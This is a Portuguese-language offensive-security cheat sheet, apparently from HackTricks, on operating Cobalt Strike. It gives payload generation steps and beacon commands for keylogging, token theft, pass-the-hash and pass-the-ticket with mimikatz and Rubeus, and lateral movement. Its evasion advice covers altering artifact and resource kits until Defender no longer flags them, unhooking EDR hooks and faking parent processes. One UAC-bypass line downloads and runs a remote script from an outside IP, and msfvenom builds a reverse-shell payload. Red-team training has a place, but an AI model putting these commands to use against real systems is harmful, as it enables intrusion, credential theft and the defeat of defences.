# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` então você pode selecionar onde escutar, qual tipo de beacon usar (http, dns, smb...) e muito mais.

### Peer2Peer Listeners

Os beacons desses listeners não precisam falar diretamente com o C2; eles podem se comunicar com ele por meio de outros beacons.

`Cobalt Strike -> Listeners -> Add/Edit`; então você precisa selecionar os beacons TCP ou SMB

* O **TCP beacon configurará um listener na porta selecionada**. Para conectar-se a um TCP beacon, use o comando `connect <ip> <port>` a partir de outro beacon
* O **smb beacon escutará em um pipename com o nome selecionado**. Para conectar-se a um SMB beacon, você precisa usar o comando `link [target] [pipe]`.

### Gerar e hospedar payloads

#### Gerar payloads em arquivos

`Attacks -> Packages ->`

* **`HTMLApplication`** para arquivos HTA
* **`MS Office Macro`** para um documento do Office com uma macro
* **`Windows Executable`** para um .exe, .dll ou service .exe
* **`Windows Executable (S)`** para um .exe, .dll ou service .exe **stageless** (stageless é melhor que staged, pois gera menos IoCs)

#### Gerar e hospedar payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Isso gerará um script/executável para baixar o beacon do Cobalt Strike em formatos como: bitsadmin, exe, powershell e python

#### Hospedar payloads

Se você já tiver o arquivo que deseja hospedar em um web server, basta acessar `Attacks -> Web Drive-by -> Host File` e selecionar o arquivo a ser hospedado e a configuração do web server.

### Opções do Beacon

<details>
<summary>Opções e comandos do Beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Um agente customizado só precisa falar o protocolo HTTP/S do Cobalt Strike Team Server (perfil malleable C2 padrão) para se registrar/fazer check-in e receber tarefas. Implemente as mesmas URIs/cabeçalhos/criptografia de metadados definidos no perfil para reutilizar a UI do Cobalt Strike para tasking e saída.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Um Aggressor Script (por exemplo, `CustomBeacon.cna`) pode encapsular a geração de payloads para o beacon não Windows, permitindo que os operadores selecionem o listener e produzam payloads ELF diretamente pela GUI.
- Exemplos de handlers de tarefas Linux expostos ao Team Server: `sleep`, `cd`, `pwd`, `shell` (executar comandos arbitrários), `ls`, `upload`, `download` e `exit`. Eles correspondem aos IDs de tarefas esperados pelo Team Server e devem ser implementados no lado do servidor para retornar a saída no formato adequado.
- O suporte a BOF no Linux pode ser adicionado carregando Beacon Object Files em processo com o [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (também suporta BOFs no estilo Outflank), permitindo que o post-exploitation modular seja executado dentro do contexto/privilégios do implant sem criar novos processos.<sup>[[2]](#references)[[3]](#references)</sup>
- Incorpore um handler SOCKS no custom beacon para manter a paridade de pivoting com os Windows Beacons: quando o operador executar `socks <port>`, o implant deverá abrir um proxy local para encaminhar as ferramentas do operador através do host Linux comprometido para as redes internas.

## Opsec

### Execute-Assembly

O **`execute-assembly`** usa um **processo sacrificial** com remote process injection para executar o programa indicado. Isso é muito ruidoso, pois, para injetar dentro de um processo, determinadas APIs do Windows são usadas e todo EDR as verifica. No entanto, existem algumas ferramentas customizadas que podem ser usadas para carregar algo no mesmo processo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- No Cobalt Strike, você também pode usar BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

O Aggressor Script `https://github.com/outflanknl/HelpColor` criará o comando `helpx` no Cobalt Strike, que adicionará cores aos comandos indicando se eles são BOFs (verde), se são Frok&Run (amarelo) e similares, ou se são ProcessExecution, injection ou similares (vermelho). Isso ajuda a saber quais comandos são mais stealthy.

### Agir como o usuário

Você pode verificar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Verifique todos os logons interativos para conhecer o horário normal de operação.
- System EID 12,13 - Verifique a frequência de desligamentos/inicializações/suspensões.
- Security EID 4624/4625 - Verifique tentativas NTLM de entrada válidas/inválidas.
- Security EID 4648 - Esse evento é criado quando credenciais em texto simples são usadas para fazer logon. Se um processo o gerou, o binário potencialmente contém as credenciais em texto claro em um arquivo de configuração ou dentro do código.

Ao usar `jump` no cobalt strike, é melhor usar o método `wmi_msbuild` para fazer o novo processo parecer mais legítimo.

### Usar computer accounts

É comum que os defensores verifiquem comportamentos estranhos gerados por usuários e **excluam service accounts e computer accounts, como `*$`, do monitoramento**. Você pode usar essas contas para realizar lateral movement ou privilege escalation.

### Usar stageless payloads

Stageless payloads são menos ruidosos que os staged, pois não precisam baixar um segundo estágio do servidor C2. Isso significa que não geram tráfego de rede após a conexão inicial, tornando-os menos propensos a serem detectados por defesas baseadas em rede.

### Tokens & Token Store

Tenha cuidado ao roubar ou gerar tokens, pois pode ser possível que um EDR enumere todos os tokens de todas as threads e encontre um **token pertencente a um usuário diferente** ou até mesmo ao SYSTEM no processo.

Isso permite armazenar tokens **por beacon**, para que não seja necessário roubar o mesmo token repetidamente. Isso é útil para lateral movement ou quando você precisa usar um token roubado várias vezes:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Ao fazer lateral movement, geralmente é melhor **roubar um token em vez de gerar um novo** ou realizar um ataque pass the hash.

### Guardrails

O Cobalt Strike possui um recurso chamado **Guardrails**, que ajuda a impedir o uso de determinados comandos ou ações que poderiam ser detectados pelos defensores. Os Guardrails podem ser configurados para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec` e outros normalmente usados para lateral movement ou privilege escalation.

Além disso, o repositório [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) também contém algumas verificações e ideias que você pode considerar antes de executar um payload.

### Criptografia de tickets

Em um AD, tenha cuidado com a criptografia dos tickets. Por padrão, algumas ferramentas usarão criptografia RC4 para tickets Kerberos, que é menos segura que a criptografia AES, e ambientes atualizados normalmente usarão AES por padrão. Isso pode ser detectado por defensores que monitoram algoritmos de criptografia fracos.

### Evitar padrões

Ao usar o Cobalt Stricke, por padrão, os SMB pipes terão os nomes `msagent_####` e `"status_####"`. Altere esses nomes. É possível verificar os nomes dos pipes existentes no Cobal Strike com o comando: `ls \\.\pipe\`

Além disso, com sessões SSH, um pipe chamado `\\.\pipe\postex_ssh_####` é criado. Altere-o com `set ssh_pipename "<new_name>";`.

Também nos ataques de postexploitation, os pipes `\\.\pipe\postex_####` podem ser modificados com `set pipename "<new_name>"`.

Nos perfis do Cobalt Strike, você também pode modificar itens como:

- Evitar o uso de `rwx`
- Como o comportamento de process injection funciona (quais APIs serão usadas) no bloco `process-inject {...}`
- Como o "fork and run" funciona no bloco `post-ex {…}`
- O tempo de sleep
- O tamanho máximo dos binários a serem carregados na memória
- O memory footprint e o conteúdo da DLL com o bloco `stage {...}`
- O tráfego de rede

### Bypass de memory scanning

Alguns ERDs escaneiam a memória em busca de assinaturas conhecidas de malware. O Coblat Strike permite modificar a função `sleep_mask` como um BOF capaz de criptografar o bacldoor na memória.

### Injeções de processos ruidosas

Ao injetar código em um processo, isso geralmente é muito ruidoso, pois **nenhum processo comum costuma realizar essa ação e as formas de fazê-lo são muito limitadas**. Portanto, isso pode ser detectado por sistemas de detecção baseados em comportamento. Além disso, também pode ser detectado por EDRs que escaneiam a memória em busca de **threads contendo código que não está no disco** (embora processos como navegadores, que usam JIT, apresentem isso com frequência). Exemplo: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | Relações de PID e PPID

Ao criar um novo processo, é importante **manter uma relação pai-filho normal** entre os processos para evitar a detecção. Se svchost.exec estiver executando iexplorer.exe, isso parecerá suspeito, pois svchost.exe não é um processo pai de iexplorer.exe em um ambiente Windows normal.

Quando um novo beacon é criado no Cobalt Strike, por padrão, um processo usando **`rundll32.exe`** é criado para executar o novo listener. Isso não é muito stealthy e pode ser facilmente detectado por EDRs. Além disso, `rundll32.exe` é executado sem argumentos, tornando-o ainda mais suspeito.

Com o seguinte comando do Cobalt Strike, você pode especificar um processo diferente para criar o novo beacon, tornando-o menos detectável:
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Fazendo proxy do tráfego dos atacantes

Às vezes, os atacantes precisarão conseguir executar ferramentas localmente, até mesmo em máquinas Linux, e fazer o tráfego das vítimas chegar à ferramenta (por exemplo, NTLM relay).

Além disso, às vezes, para realizar um ataque pass-the.hash ou pass-the-ticket, é mais furtivo para o atacante **adicionar esse hash ou ticket ao próprio processo LSASS** localmente e então fazer pivot a partir dele, em vez de modificar um processo LSASS de uma máquina vítima.

No entanto, você precisa ter **cuidado com o tráfego gerado**, pois pode estar enviando tráfego incomum (kerberos?) a partir do seu processo backdoor. Para isso, você pode fazer pivot para um processo de navegador (embora possa ser detectado ao injetar-se em um processo; portanto, pense em uma forma furtiva de fazer isso).


### Evitando AVs

#### Bypass de AV/AMSI/ETW

Confira a página:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Normalmente, em `/opt/cobaltstrike/artifact-kit`, você pode encontrar o código e os templates pré-compilados (em `/src-common`) dos payloads que o cobalt strike usará para gerar os beacons binários.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com o backdoor gerado (ou apenas com o template compilado), você pode descobrir o que está fazendo o defender disparar. Geralmente, é uma string. Portanto, basta modificar o código que está gerando o backdoor para que essa string não apareça no binário final.

Depois de modificar o código, basta executar `./build.sh` no mesmo diretório e copiar a pasta `dist-pipe/` para o cliente Windows em `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Não se esqueça de carregar o script agressivo `dist-pipe\artifact.cna` para indicar ao Cobalt Strike que deve usar os recursos do disco que queremos, e não os que já estão carregados.

#### Resource Kit

A pasta ResourceKit contém os templates para os payloads baseados em scripts do Cobalt Strike, incluindo PowerShell, VBA e HTA.

Usando o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com os templates, você pode descobrir o que o Defender (AMSI, neste caso) não está aceitando e modificá-lo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando as linhas detectadas, pode-se gerar um template que não será detectado.

Não se esqueça de carregar o script agressivo `ResourceKit\resources.cna` para indicar ao Cobalt Strike que use os recursos do disco que queremos, e não os que foram carregados.

#### Function hooks | Syscall

Function hooking é um método muito comum dos ERDs para detectar atividades maliciosas. O Cobalt Strike permite contornar esses hooks usando **syscalls** em vez das chamadas padrão da API do Windows usando a configuração **`None`**, usar a versão `Nt*` de uma função com a configuração **`Direct`** ou simplesmente saltar sobre a função `Nt*` com a opção **`Indirect`** no malleable profile. Dependendo do sistema, uma opção pode ser mais stealth que outra.

Isso pode ser configurado no profile ou usando o comando **`syscall-method`**.

No entanto, isso também pode ser ruidoso.

Uma opção fornecida pelo Cobalt Strike para contornar function hooks é remover esses hooks com: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Você também pode verificar quais funções estão hooked com [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ou [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Comandos diversos do Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Referências

- [1] [Cobalt Strike Linux Beacon (PoC de implant customizado)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader e Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Template de nix BOF da Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Análise da Unit42 sobre a criptografia de metadata do Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Diário do SANS ISC sobre tráfego do Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
